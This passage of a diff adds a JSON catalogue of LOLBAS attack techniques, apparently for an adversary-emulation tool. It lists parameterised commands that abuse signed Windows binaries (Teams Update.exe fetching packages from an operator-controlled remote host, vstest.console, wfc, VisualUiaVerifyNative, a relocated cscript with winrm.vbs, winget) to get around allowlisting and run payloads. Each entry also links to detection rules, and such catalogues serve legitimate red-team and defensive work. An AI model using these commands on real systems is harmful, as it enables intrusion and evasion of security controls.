+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Update.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Update.exe",
+        "command_index": 3,
+        "category": "AWL Bypass",
+        "usecase": "Download and execute binary",
+        "privileges": "User",
+        "operating_system": "Windows 7 and up with Microsoft Teams installed",
+        "source_mitre_id": "T1218",
+        "full_paths": [
+          "C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\update.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://www.youtube.com/watch?v=rOP3hnkj7ls",
+          "https://twitter.com/reegun21/status/1144182772623269889",
+          "https://twitter.com/MrUn1k0d3r/status/1143928885211537408",
+          "https://twitter.com/reegun21/status/1291005287034281990",
+          "http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/",
+          "https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12",
+          "https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56",
+          "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml"
+          },
+          {
+            "IOC": "Update.exe spawned an unknown process"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "Nuget"
+          },
+          {
+            "Execute": "Remote"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Update.yml:0:3",
+        "source_tcodes": [
+          "T1218"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Operator-controlled remote infrastructure must be reachable from the authorized target."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Update.yml:0:1",
+      "name": "LOLBAS - T1218 - Update.exe - AWL Bypass - Download and execute binary [4945ef4]",
+      "description": "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. The above binary will go to url and look for RELEASES file, download and install the nuget package. Use case: Download and execute binary. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "Update.exe --update=#{lotl_lolbas_remote_url}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_remote_url"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Update.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Update.exe",
+        "command_index": 1,
+        "category": "AWL Bypass",
+        "usecase": "Download and execute binary",
+        "privileges": "User",
+        "operating_system": "Windows 7 and up with Microsoft Teams installed",
+        "source_mitre_id": "T1218",
+        "full_paths": [
+          "C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\update.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://www.youtube.com/watch?v=rOP3hnkj7ls",
+          "https://twitter.com/reegun21/status/1144182772623269889",
+          "https://twitter.com/MrUn1k0d3r/status/1143928885211537408",
+          "https://twitter.com/reegun21/status/1291005287034281990",
+          "http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/",
+          "https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12",
+          "https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56",
+          "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml"
+          },
+          {
+            "IOC": "Update.exe spawned an unknown process"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "Nuget"
+          },
+          {
+            "Execute": "Remote"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Update.yml:0:1",
+        "source_tcodes": [
+          "T1218"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Operator-controlled remote infrastructure must be reachable from the authorized target."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Update.yml:0:8",
+      "name": "LOLBAS - T1218 - Update.exe - AWL Bypass - Download and execute binary [a762fc9]",
+      "description": "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA. Use case: Download and execute binary. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "Update.exe --updateRollback=#{lotl_lolbas_remote_host}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Update.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Update.exe",
+        "command_index": 8,
+        "category": "AWL Bypass",
+        "usecase": "Download and execute binary",
+        "privileges": "User",
+        "operating_system": "Windows 7 and up with Microsoft Teams installed",
+        "source_mitre_id": "T1218",
+        "full_paths": [
+          "C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\update.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://www.youtube.com/watch?v=rOP3hnkj7ls",
+          "https://twitter.com/reegun21/status/1144182772623269889",
+          "https://twitter.com/MrUn1k0d3r/status/1143928885211537408",
+          "https://twitter.com/reegun21/status/1291005287034281990",
+          "http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/",
+          "https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12",
+          "https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56",
+          "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml"
+          },
+          {
+            "IOC": "Update.exe spawned an unknown process"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "Nuget"
+          },
+          {
+            "Execute": "Remote"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Update.yml:0:8",
+        "source_tcodes": [
+          "T1218"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Operator-controlled remote infrastructure must be reachable from the authorized target."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Update.yml:0:5",
+      "name": "LOLBAS - T1218 - Update.exe - AWL Bypass - Download and execute binary [c1e1cf0]",
+      "description": "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. The above binary will go to url and look for RELEASES file, download and install the nuget package. Use case: Download and execute binary. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "Update.exe --updateRollback=#{lotl_lolbas_remote_url}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_remote_url"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Update.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Update.exe",
+        "command_index": 5,
+        "category": "AWL Bypass",
+        "usecase": "Download and execute binary",
+        "privileges": "User",
+        "operating_system": "Windows 7 and up with Microsoft Teams installed",
+        "source_mitre_id": "T1218",
+        "full_paths": [
+          "C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\update.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://www.youtube.com/watch?v=rOP3hnkj7ls",
+          "https://twitter.com/reegun21/status/1144182772623269889",
+          "https://twitter.com/MrUn1k0d3r/status/1143928885211537408",
+          "https://twitter.com/reegun21/status/1291005287034281990",
+          "http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/",
+          "https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12",
+          "https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56",
+          "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml"
+          },
+          {
+            "IOC": "Update.exe spawned an unknown process"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "Nuget"
+          },
+          {
+            "Execute": "Remote"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Update.yml:0:5",
+        "source_tcodes": [
+          "T1218"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Operator-controlled remote infrastructure must be reachable from the authorized target."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/VisualUiaVerifyNative.yml:0:0",
+      "name": "LOLBAS - T1218 - VisualUiaVerifyNative.exe - AWL Bypass - Execute proxied payload with Microsoft signed binary to bypass WDAC policies [367e8a9]",
+      "description": "A Windows SDK binary for manual and automated testing of Microsoft UI Automation implementation and controls.. Generate Serialized gadget and save to - `C:\\Users\\%USERNAME%\\AppData\\Roaminguiverify.config` before executing. Use case: Execute proxied payload with Microsoft signed binary to bypass WDAC policies. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "VisualUiaVerifyNative.exe",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/VisualUiaVerifyNative.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/VisualUiaVerifyNative.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "VisualUiaVerifyNative.exe",
+        "command_index": 0,
+        "category": "AWL Bypass",
+        "usecase": "Execute proxied payload with Microsoft signed binary to bypass WDAC policies",
+        "privileges": "User",
+        "operating_system": "Windows 10 2004 (likely previous and newer versions as well)",
+        "source_mitre_id": "T1218",
+        "full_paths": [
+          "c:\\Program Files (x86)\\Windows Kits\\10\\bin\\<version>\\arm64\\UIAVerify\\VisualUiaVerifyNative.exe",
+          "c:\\Program Files (x86)\\Windows Kits\\10\\bin\\<version>\\x64\\UIAVerify\\VisualUiaVerifyNative.exe",
+          "c:\\Program Files (x86)\\Windows Kits\\10\\bin\\<version>\\UIAVerify\\VisualUiaVerifyNative.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://bohops.com/2020/10/15/exploring-the-wdac-microsoft-recommended-block-rules-visualuiaverifynative/",
+          "https://github.com/MicrosoftDocs/windows-itpro-docs/commit/937db704b9148e9cee7c7010cad4d00ce9c4fdad"
+        ],
+        "detection": [
+          {
+            "BlockRule": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6b34764215b0e97e32cbc4c6325fc933d2695c3a/rules/windows/process_creation/proc_creation_win_lolbin_visualuiaverifynative.yml"
+          },
+          {
+            "IOC": "As a Windows SDK binary, execution on a system may be suspicious"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": ".NetObjects"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/VisualUiaVerifyNative.yml:0:0",
+        "source_tcodes": [
+          "T1218"
+        ],
+        "context": "all",
+        "readiness": "ready",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/vstest.console.yml:0:0",
+      "name": "LOLBAS - T1127 - vstest.console.exe - AWL Bypass - Proxy Execution and AWL bypass, Adversaries may run malicious code embedded inside the... [d3ad3a0]",
+      "description": "VSTest.Console.exe is the command-line tool to run tests. VSTest functionality may allow an adversary to executes their malware by wrapping it as a test method then build it to a .exe or .dll file to be later run by vstest.console.exe. This may both allow AWL bypass or defense bypass in general Use case: Proxy Execution and AWL bypass, Adversaries may run malicious code embedded inside the test methods of crafted dll/exe. Privilege: User.",
+      "tactic": "Multiple",
+      "tcode": "T1127",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "vstest.console.exe #{lotl_lolbas_payload_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/vstest.console.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/vstest.console.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "vstest.console.exe",
+        "command_index": 0,
+        "category": "AWL Bypass",
+        "usecase": "Proxy Execution and AWL bypass, Adversaries may run malicious code embedded inside the test methods of crafted dll/exe",
+        "privileges": "User",
+        "operating_system": "Windows 10, Windows 11",
+        "source_mitre_id": "T1127",
+        "full_paths": [
+          "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TestWindow\\vstest.console.exe",
+          "C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\TestAgent\\Common7\\IDE\\CommonExtensions\\Microsoft\\TestWindow\\vstest.console.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://learn.microsoft.com/en-us/visualstudio/test/vstest-console-options?view=vs-2022"
+        ],
+        "detection": [
+          {
+            "IOC": "vstest.console.exe spawning unexpected processes"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "DLL"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/vstest.console.yml:0:0",
+        "source_tcodes": [
+          "T1127"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Wfc.yml:0:0",
+      "name": "LOLBAS - T1127 - Wfc.exe - AWL Bypass - Execute proxied payload with Microsoft signed binary to bypass WDAC policies [65e0cec]",
+      "description": "The Workflow Command-line Compiler tool is included with the Windows Software Development Kit (SDK).. Execute arbitrary C# code embedded in a XOML file. Use case: Execute proxied payload with Microsoft signed binary to bypass WDAC policies. Privilege: User.",
+      "tactic": "Multiple",
+      "tcode": "T1127",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "wfc.exe #{lotl_lolbas_local_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Wfc.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wfc.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Wfc.exe",
+        "command_index": 0,
+        "category": "AWL Bypass",
+        "usecase": "Execute proxied payload with Microsoft signed binary to bypass WDAC policies",
+        "privileges": "User",
+        "operating_system": "Windows 10 2004 (likely previous and newer versions as well)",
+        "source_mitre_id": "T1127",
+        "full_paths": [
+          "C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\v10.0A\\bin\\NETFX 4.8 Tools\\wfc.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://bohops.com/2020/11/02/exploring-the-wdac-microsoft-recommended-block-rules-part-ii-wfc-fsi/"
+        ],
+        "detection": [
+          {
+            "BlockRule": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6b34764215b0e97e32cbc4c6325fc933d2695c3a/rules/windows/process_creation/proc_creation_win_lolbin_wfc.yml"
+          },
+          {
+            "IOC": "As a Windows SDK binary, execution on a system may be suspicious"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "XOML"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Wfc.yml:0:0",
+        "source_tcodes": [
+          "T1127"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Winget.yml:0:2",
+      "name": "LOLBAS - T1105 - winget.exe - AWL Bypass - Download and install software from Microsoft Store, even if Microsoft Store App is bloc... [7019f10]",
+      "description": "Windows Package Manager tool. Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine, and even if AppLocker is active on the machine. For example, use \"Sysinternals Suite\" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this. Use case: Download and install software from Microsoft Store, even if Microsoft Store App is blocked, and AppLocker is activated on the machine. Privilege: User.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "winget.exe install --accept-package-agreements -s msstore #{lotl_lolbas_argument}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_argument"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Winget.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Winget.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "winget.exe",
+        "command_index": 2,
+        "category": "AWL Bypass",
+        "usecase": "Download and install software from Microsoft Store, even if Microsoft Store App is blocked, and AppLocker is activated on the machine",
+        "privileges": "User",
+        "operating_system": "Windows 10, Windows 11",
+        "source_mitre_id": "T1105",
+        "full_paths": [
+          "C:\\Users\\user\\AppData\\Local\\Microsoft\\WindowsApps\\winget.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://saulpanders.github.io/2022/01/02/New-Year-New-LOLBAS.html",
+          "https://docs.microsoft.com/en-us/windows/package-manager/winget/#production-recommended",
+          "https://www.youtube.com/watch?v=zuL7x4Wltto"
+        ],
+        "detection": [
+          {
+            "IOC": "winget.exe spawned with local manifest file"
+          },
+          {
+            "IOC": "Sysmon Event ID 1 - Process Creation"
+          },
+          {
+            "Analysis": "https://saulpanders.github.io/2022/01/02/New-Year-New-LOLBAS.html"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winget_local_install_via_manifest.yml"
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Winget.yml:0:2",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OSScripts/Winrm.yml:0:2",
+      "name": "LOLBAS - T1220 - winrm.vbs - AWL Bypass - Execute arbitrary, unsigned code via XSL script [2d2484d]",
+      "description": "Script used for manage Windows RM settings. Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe. Use case: Execute arbitrary, unsigned code via XSL script. Privilege: User.",
+      "tactic": "Multiple",
+      "tcode": "T1220",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "%SystemDrive%\\BypassDir\\cscript //nologo %windir%\\System32\\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OSScripts/Winrm.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Winrm.yml",
+        "source_directory": "OSScripts",
+        "source_name": "winrm.vbs",
+        "command_index": 2,
+        "category": "AWL Bypass",
+        "usecase": "Execute arbitrary, unsigned code via XSL script",
+        "privileges": "User",
+        "operating_system": "Windows 10, Windows 11",
+        "source_mitre_id": "T1220",
+        "full_paths": [
+          "C:\\Windows\\System32\\winrm.vbs",
+          "C:\\Windows\\SysWOW64\\winrm.vbs"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology",
+          "https://www.youtube.com/watch?v=3gz1QmiMhss",
+          "https://github.com/enigma0x3/windows-operating-system-archaeology",
+          "https://redcanary.com/blog/lateral-movement-winrm-wmi/",
+          "https://twitter.com/bohops/status/994405551751815170",
+          "https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404",
+          "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_awl_bypass.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/file/file_event/file_event_win_winrm_awl_bypass.yml"
+          },
+          {
+            "BlockRule": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "XSL"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSScripts/Winrm.yml:0:2",
+        "source_tcodes": [
+          "T1220"
+        ],
+        "context": "all",
+        "readiness": "ready",
+        "prerequisites": []
+      }
+    }
+  ],
+  "chains": []
+}
